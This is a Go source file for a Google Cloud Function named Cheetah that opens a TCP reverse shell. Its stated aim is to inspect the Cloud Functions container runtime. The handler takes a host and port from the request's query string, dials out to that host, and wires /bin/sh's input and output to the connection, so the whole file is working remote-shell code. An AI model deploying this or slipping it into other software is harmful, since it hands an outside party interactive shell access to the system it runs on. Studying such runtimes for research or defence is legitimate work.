/*
Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.

References:
https://github.com/sathish09/rev2go
https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e
*/
package cheetah

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"
)

func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
	type Response struct {
		Message string `json:"message"`
	}

	response := &Response{Message: errMsg}
	responseJSON, _ := json.Marshal(response)
	w.WriteHeader(statusCode)
	fmt.Fprintf(w, "%s", responseJSON)
}

// Cheetah establishes a TCP reverse shell connection.
func Cheetah(w http.ResponseWriter, r *http.Request) {
	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)

	if err != nil {
		respondWithError(w, err.Error(), 500)
		return
	}

	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
	time.AfterFunc(time.Duration(timeout)*time.Second, func() {
		os.Exit(0)
	})

	type Response struct {
		Error string
	}

	host := r.URL.Query().Get("host")
	port := r.URL.Query().Get("port")

	if host == "" || port == "" {
		respondWithError(w, "Must provide the host and port for the target TCP server as query parameters.", 400)
		return
	}

	portNum, err := strconv.ParseUint(r.URL.Query().Get("port"), 10, 64)

	if err != nil {
		respondWithError(w, err.Error(), 500)
		return
	}

	connString := fmt.Sprintf("%s:%d", host, portNum)

	conn, err := net.Dial("tcp", connString)

	if err != nil {
		respondWithError(w, err.Error(), 500)
		return
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()

	respondWithError(w, "Connection terminated from client.", 500)
	conn.Close()
}
